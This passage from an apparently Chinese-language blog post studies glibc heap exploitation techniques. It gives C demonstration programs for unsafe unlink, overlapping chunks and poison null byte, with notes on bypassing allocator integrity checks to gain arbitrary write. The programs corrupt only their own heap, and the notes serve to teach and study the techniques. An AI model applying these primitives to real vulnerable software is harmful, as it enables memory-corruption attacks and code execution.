(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);<br>    chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Fake chunk 的 fd: %p\n&quot;</span>,(<span class="hljs-type">void</span>*) chunk0_ptr[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Fake chunk 的 bk: %p\n\n&quot;</span>,(<span class="hljs-type">void</span>*) chunk0_ptr[<span class="hljs-number">3</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在假设 chunk0 中存在一个溢出漏洞，可以更改 chunk1 的数据\n&quot;</span>);<br>    <span class="hljs-type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;通过修改 chunk1 中 prev_size 的大小使得 chunk1 在 free 的时候误以为 前面的 free chunk 是从我们伪造的 free chunk 开始的\n&quot;</span>);<br>    chunk1_hdr[<span class="hljs-number">0</span>] = malloc_size;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;如果正常的 free chunk0 的话 chunk1 的 prev_size 应该是 0x90 但现在被改成了 %p\n&quot;</span>,(<span class="hljs-type">void</span>*)chunk1_hdr[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来通过把 chunk1 的 prev_inuse 改成 0 来把伪造的堆块标记为空闲的堆块\n\n&quot;</span>);<br>    chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在释放掉 chunk1，会触发 unlink，合并两个 free chunk\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(chunk1_ptr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;此时，我们可以用 chunk0_ptr 覆盖自身以指向任意位置\n&quot;</span>);<br>    <span class="hljs-type">char</span> victim_string[<span class="hljs-number">8</span>];<br>    <span class="hljs-built_in">strcpy</span>(victim_string,<span class="hljs-string">&quot;Hello!~&quot;</span>);<br>    chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) victim_string;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk0_ptr 现在指向我们想要的位置，我们用它来覆盖我们的 victim string。\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;之前的值是: %s\n&quot;</span>,victim_string);<br>    chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4141414142424242L</span>L;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;新的值是: %s\n&quot;</span>,victim_string);<br>&#125;<br></code></pre></td></tr></table></figure><p>检查绕过：</p><blockquote><p>P-&gt;fd&#x3D;ptr-0x18，P-&gt;bk&#x3D;ptr-0x10</p></blockquote><p>利用unlink的FD-&gt;bk&#x3D;BK,BK-&gt;fd&#x3D;FD的特性，几乎可以做到任意地址写。</p><blockquote><p>此时ptr被修改为ptr-0x18，可以通过更改bk指针的值来进行利用</p></blockquote><p>（unsafe_unlink在glibc_2.31之前都是可以用的，利用unsafe_unlink需要泄露堆地址）</p><h3 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span>&#123;<br><br>    <span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这是一个简单的堆块重叠问题，首先申请 3 个 chunk\n&quot;</span>);<br><br>    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这三个 chunk 分别申请到了:\np1：%p\np2：%p\np3：%p\n给他们分别填充\&quot;1\&quot;\&quot;2\&quot;\&quot;3\&quot;\n\n&quot;</span>, p1, p2, p3);<br><br>    <span class="hljs-built_in">memset</span>(p1, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memset</span>(p2, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉 p2\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p2 被放到 unsorted bin 中\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在假设有一个堆溢出漏洞，可以覆盖 p2\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;为了保证堆块稳定性，我们至少需要让 prev_inuse 为 1，确保 p1 不会被认为是空闲的堆块\n&quot;</span>);<br><br>    <span class="hljs-type">int</span> evil_chunk_size = <span class="hljs-number">0x181</span>;<br>    <span class="hljs-type">int</span> evil_region_size = <span class="hljs-number">0x180</span> - <span class="hljs-number">8</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们将 p2 的大小设置为 %d, 这样的话我们就能用 %d 大小的空间\n&quot;</span>,evil_chunk_size, evil_region_size);<br><br>    *(p2<span class="hljs-number">-1</span>) = evil_chunk_size; <span class="hljs-comment">// 覆盖 p2 的 size</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n现在让我们分配另一个块，其大小等于块p2注入大小的数据大小\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc 将会把前面 free 的 p2 分配给我们（p2 的 size 已经被改掉了）\n&quot;</span>);<br>    p4 = <span class="hljs-built_in">malloc</span>(evil_region_size);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np4 分配在 %p 到 %p 这一区域\n&quot;</span>, (<span class="hljs-type">char</span> *)p4, (<span class="hljs-type">char</span> *)p4+evil_region_size);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 从 %p 到 %p\n&quot;</span>, (<span class="hljs-type">char</span> *)p3, (<span class="hljs-type">char</span> *)p3+<span class="hljs-number">0x80</span><span class="hljs-number">-8</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 应该与 p3 重叠，在这种情况下 p4 包括所有 p3\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候通过编辑 p4 就可以修改 p3 的内容，修改 p3 也可以修改 p4 的内容\n\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来验证一下，现在 p3 与 p4:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3+<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n如果我们使用 memset(p4, &#x27;4&#x27;, %d), 将会:\n&quot;</span>, evil_region_size);<br>    <span class="hljs-built_in">memset</span>(p4, <span class="hljs-string">&#x27;4&#x27;</span>, evil_region_size);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3+<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n那么之后再 memset(p3, &#x27;3&#x27;, 80), 将会:\n&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3+<span class="hljs-number">0x10</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>申请一个大堆块p2（大于0x80），把p2 free掉会进入unsortedbins，这时候把size改为p2的size+p3的size-0x20，再把p2申请回来就会出现p2完全覆盖p3。此时p2可以修改p3的内容，p3也可以修改p2的内容。</p><h3 id="over-lapping-chunks-2"><a href="#over-lapping-chunks-2" class="headerlink" title="over_lapping_chunks_2"></a>over_lapping_chunks_2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <br>  <span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;<br>  <span class="hljs-type">int</span> prev_in_use = <span class="hljs-number">0x1</span>;<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n一开始分配 5 个 chunk&quot;</span>);<br><br>  p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  real_size_p1 = malloc_usable_size(p1);<br>  real_size_p2 = malloc_usable_size(p2);<br>  real_size_p3 = malloc_usable_size(p3);<br>  real_size_p4 = malloc_usable_size(p4);<br>  real_size_p5 = malloc_usable_size(p5);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p1 从 %p 到 %p&quot;</span>, p1, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1+malloc_usable_size(p1));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p2 从 %p 到 %p&quot;</span>, p2,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p2+malloc_usable_size(p2));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p3 从 %p 到 %p&quot;</span>, p3,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p3+malloc_usable_size(p3));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p4 从 %p 到 %p&quot;</span>, p4, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p4+malloc_usable_size(p4));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p5 从 %p 到 %p\n&quot;</span>, p5,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p5+malloc_usable_size(p5));<br><br>  <span class="hljs-built_in">memset</span>(p1,<span class="hljs-string">&#x27;A&#x27;</span>,real_size_p1);<br>  <span class="hljs-built_in">memset</span>(p2,<span class="hljs-string">&#x27;B&#x27;</span>,real_size_p2);<br>  <span class="hljs-built_in">memset</span>(p3,<span class="hljs-string">&#x27;C&#x27;</span>,real_size_p3);<br>  <span class="hljs-built_in">memset</span>(p4,<span class="hljs-string">&#x27;D&#x27;</span>,real_size_p4);<br>  <span class="hljs-built_in">memset</span>(p5,<span class="hljs-string">&#x27;E&#x27;</span>,real_size_p5);<br>  <br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n释放掉堆块 p4，在这种情况下不会用 top chunk 合并\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p4);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n假设 p1 上的漏洞，该漏洞会把 p2 的 size 改成 p2+p3 的 size\n&quot;</span>);<br><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>;<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nfree p2 的时候分配器会因为 p2+p2.size 的结果指向 p4，而误以为下一个 chunk 是 p4\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n这样的话将会 free 掉的 p2 将会包含 p3\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p2);<br>  <br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n现在去申请 2000 大小的 chunk p6 的时候，会把之前释放掉的 p2 与 p3 一块申请回来\n&quot;</span>);<br><br>  p6 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2000</span>);<br>  real_size_p6 = malloc_usable_size(p6);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p6 从 %p 到 %p&quot;</span>, p6,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p6+real_size_p6);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p3 从 %p 到 %p\n&quot;</span>, p3, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) p3+real_size_p3);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np3 中的内容: \n\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-type">char</span> *)p3);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n往 p6 中写入\&quot;F\&quot;\n&quot;</span>);<br>  <span class="hljs-built_in">memset</span>(p6,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-number">1500</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np3 中的内容: \n\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-type">char</span> *)p3);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>与前面不同的是，这次修改size是在free之前的，修改之后free p2会把p2和p3识别成一个块，然后把它申请回来就能用p2控制p3</p><h3 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h3><p>同前面，不过不是在堆上，而是用mmap分配的一个新区域</p><h3 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h3> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;当存在 off by null 的时候可以使用该技术\n&quot;</span>);<br><br>    <span class="hljs-type">uint8_t</span>* a;<br>    <span class="hljs-type">uint8_t</span>* b;<br>    <span class="hljs-type">uint8_t</span>* c;<br>    <span class="hljs-type">uint8_t</span>* b1;<br>    <span class="hljs-type">uint8_t</span>* b2;<br>    <span class="hljs-type">uint8_t</span>* d;<br>    <span class="hljs-type">void</span> *barrier;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请 0x100 的 chunk a\n&quot;</span>);<br>    a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;a 在: %p\n&quot;</span>, a);<br>    <span class="hljs-type">int</span> real_a_size = malloc_usable_size(a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;因为我们想要溢出 chunk a，所以需要知道他的实际大小: %#x\n&quot;</span>, real_a_size);<br><br>    b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br>    c = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br>    barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;另外再申请了一个 chunk c：%p，防止 free 的时候与 top chunk 发生合并的情况\n&quot;</span>, barrier);<br><br>    <span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;会检查 chunk size 与 next chunk 的 prev_size 是否相等，所以要在后面一个 0x200 来绕过检查\n&quot;</span>);<br>    *(<span class="hljs-type">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><br>    <span class="hljs-built_in">free</span>(b);<br>    <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b 的 size: %#lx\n&quot;</span>, *b_size_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;假设我们写 chunk a 的时候多写了一个 0x00 在 b 的 size 的 p 位上\n&quot;</span>);<br>    a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b 现在的 size: %#lx\n&quot;</span>, *b_size_ptr);<br><br>    <span class="hljs-type">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-2</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;c 的 prev_size 是 %#lx\n&quot;</span>,*c_prev_size_ptr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;但他根据 chunk b 的 size 找的时候会找到 b+0x1f0 那里，我们将会成功绕过 chunk 的检测 chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,<br>        *((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>)), *(<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x10</span> + *((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>))));<br>    b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请一个 0x100 大小的 b1: %p\n&quot;</span>,b1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在我们 malloc 了 b1 他将会放在 b 的位置，这时候 c 的 prev_size 依然是: %#lx\n&quot;</span>,*c_prev_size_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;但是我们之前写 0x200 那个地方已经改成了: %lx\n&quot;</span>,*(((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-4</span>));<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来 malloc &#x27;b2&#x27;, 作为 &#x27;victim&#x27; chunk.\n&quot;</span>);<br><br>    b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b2 申请在: %p\n&quot;</span>,b2);<br><br>    <span 